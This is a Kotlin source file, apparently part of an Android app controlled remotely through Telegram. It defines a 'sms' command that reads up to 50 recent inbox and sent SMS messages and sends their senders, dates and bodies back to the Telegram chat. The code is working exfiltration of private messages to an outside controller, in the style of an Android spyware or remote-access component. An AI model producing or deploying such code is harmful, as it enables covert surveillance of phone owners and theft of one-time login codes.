package com.soll.domain.command.handlers

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.telephony.SmsManager
import androidx.core.content.ContextCompat
import com.soll.data.api.model.Message
import com.soll.data.repository.TelegramRepository
import com.soll.domain.command.CommandHandler
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SmsHandler(
    context: Context,
    telegramRepository: TelegramRepository
) : CommandHandler(context, telegramRepository) {

    override val command = "sms"
    override val description = "Read SMS messages"

    private val dateFormat = SimpleDateFormat("dd.MM.yyyy HH:mm", Locale.getDefault())

    override suspend fun execute(message: Message, args: String?) {
        if (!hasPermission()) {
            reply(message, "SMS permission not granted. Please grant SMS permission in app settings.")
            return
        }

        val count = args?.toIntOrNull() ?: 10
        val limitedCount = count.coerceIn(1, 50)

        val smsList = readSms(limitedCount)

        if (smsList.isEmpty()) {
            reply(message, "No SMS messages found.")
            return
        }

        val text = buildString {
            append("<b>📱 Last $limitedCount SMS Messages</b>\n\n")

            smsList.forEachIndexed { index, sms ->
                append("<b>${index + 1}.</b> ")
                append(if (sms.type == SMS_TYPE_INBOX) "📥" else "📤")
                append(" <b>${sms.address}</b>\n")
                append("<i>${sms.date}</i>\n")

                // Truncate long messages
                val body = if (sms.body.length > 100) {
                    sms.body.take(100) + "..."
                } else {
                    sms.body
                }
                append(escapeHtml(body))
                append("\n\n")
            }
        }

        reply(message, text)
    }

    private fun hasPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun readSms(count: Int): List<SmsData> {
        val smsList = mutableListOf<SmsData>()
        val uri = Uri.parse("content://sms")

        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(
                uri,
                arrayOf("_id", "address", "body", "date", "type"),
                null,
                null,
                "date DESC LIMIT $count"
            )

            cursor?.let {
                val addressIndex = it.getColumnIndex("address")
                val bodyIndex = it.getColumnIndex("body")
                val dateIndex = it.getColumnIndex("date")
                val typeIndex = it.getColumnIndex("type")

                while (it.moveToNext()) {
                    val address = it.getString(addressIndex) ?: "Unknown"
                    val body = it.getString(bodyIndex) ?: ""
                    val date = it.getLong(dateIndex)
                    val type = it.getInt(typeIndex)

                    smsList.add(
                        SmsData(
                            address = address,
                            body = body,
                            date = dateFormat.format(Date(date)),
                            type = type
                        )
                    )
                }
            }
        } finally {
            cursor?.close()
        }

        return smsList
    }

    private fun escapeHtml(text: String): String {
        return text
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }

    private data class SmsData(
        val address: String,
        val body: String,
        val date: String,
        val type: Int
    )

    companion object {
        private const val SMS_TYPE_INBOX = 1
        private const val SMS_TYPE_SENT = 2
    }
}
